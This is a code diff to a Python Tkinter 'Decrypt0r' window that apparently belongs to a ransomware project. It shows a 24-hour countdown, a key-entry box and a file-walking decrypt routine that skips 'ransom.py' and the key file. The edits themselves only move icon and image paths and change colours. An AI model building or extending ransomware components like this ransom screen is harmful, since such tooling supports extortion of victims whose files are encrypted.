@@ -20,7 +20,7 @@ def decrypt_files():
     files = []
     for foldername, subfolders, filenames in os.walk(root_path):
         for filename in filenames:
-            if filename not in ("desktop.ini", "ransom.py", "generatedkey.key", "ransomdecrypter.py"):
+            if filename not in ("desktop.ini", "ransom.py", "generatedkey.key", "Decrypt0r.py"):
                 file_path = os.path.join(foldername, filename)
                 files.append(file_path)
 
@@ -46,12 +46,12 @@ def update_clock(seconds):
     if seconds > 0:
         root.after(1000, update_clock, seconds - 1)
 
-
+ikon_yolu = os.path.join("icon", "key.ico")
 root = Tk()
 root.title("Decrypt0r")
 root.geometry("490x500")
 root.resizable(False, False)
-root.iconbitmap("key.ico")
+root.iconbitmap(ikon_yolu)
 
 class EntryWithPlaceholder(Entry):
     def __init__(self, master=None, placeholder="", color='grey', *args, **kwargs):
@@ -79,9 +79,8 @@ class EntryWithPlaceholder(Entry):
         if not self.get():
             self.put_placeholder()
 
-
-# Arka plan resmi
-background_image = Image.open("rans12.jpg")
+resim_yolu = os.path.join("icon", "rans12.jpg")
+background_image = Image.open(resim_yolu)
 background_photo = ImageTk.PhotoImage(background_image)
 background_label = Label(root, image=background_photo)
 background_label.place(relwidth=1, relheight=1)
@@ -91,12 +90,12 @@ clock_label.place(relx=0.53, rely=0.35, anchor=CENTER)
 duration_seconds = 24 * 3600
 update_clock(duration_seconds)
 
-# Kullanıcı tarafından belirlenebilecek metin kutusu etiketi
 label_key = Label(root, text="Key:", fg="#000000", font=("Helvetica", 10, "bold"))
 label_key.config(bg="#0ab9d8", padx=5, pady=3, borderwidth=1, relief="solid")
 label_key.pack(pady=(320, 0), padx=(10, 5), side="left", anchor="w")
 
 entry_key = EntryWithPlaceholder(root, placeholder="Enter your key", width=30)
+entry_key.config(bg="#0ab9d8")
 entry_key.pack(pady=(400, 20), padx=10, fill="x")
 
 button_encrypt = Button(root, text="Decyrpt!!", command=decrypt_files,background="#0ab9d8",font=("Arial", 10, "bold"))
